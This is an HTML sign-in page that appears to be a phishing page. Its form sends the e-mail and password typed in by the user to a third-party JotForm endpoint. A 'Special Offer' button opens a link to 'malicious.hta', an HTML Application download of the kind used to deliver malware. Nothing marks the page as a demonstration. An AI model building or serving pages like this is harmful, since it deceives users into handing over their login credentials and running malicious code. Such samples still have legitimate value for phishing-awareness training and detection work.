<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign-In Page</title>
<script>
function validateForm() {
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;
    if (username.trim() === "" || password.trim() === "") {
        alert("Both username and password fields must be filled out.");
        return false;
    }
    return true;
}
</script>
</head>
<body style="margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background: url('https://d3j0t7vrtr92dk.cloudfront.net/codeacademy/1682943362_nasa.png') no-repeat center center; background-size: cover;">
    <div style="width: 300px; padding: 20px; background-color: rgba(255, 255, 255, 0.8); border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
        <h2 style="text-align: center;">Sign In</h2>
        <form action="https://form.jotform.com/241262646456459" method="post" onsubmit="return validateForm()">
            <div style="margin-bottom: 10px;">
                <label for="username" style="display: block; margin-bottom: 5px;">E-mail</label>
                <input type="text" id="username" name="username" style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px;">
            </div>
            <div style="margin-bottom: 20px;">
                <label for="password" style="display: block; margin-bottom: 5px;">Password</label>
                <input type="password" id="password" name="password" style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px;">
            </div>
            <button type="submit" style="width: 100%; padding: 10px; border: none; border-radius: 4px; background-color: #007BFF; color: white; cursor: pointer;">Sign In</button>
            <button type="submit" style="width: 100%; padding: 10px; border: none; border-radius: 4px; background-color: #007BFF; color: white; cursor: pointer;" onclick="window.open('http://malicious.hta')">Special Offer</button>

        </form>
    </div>
</body>
</html>
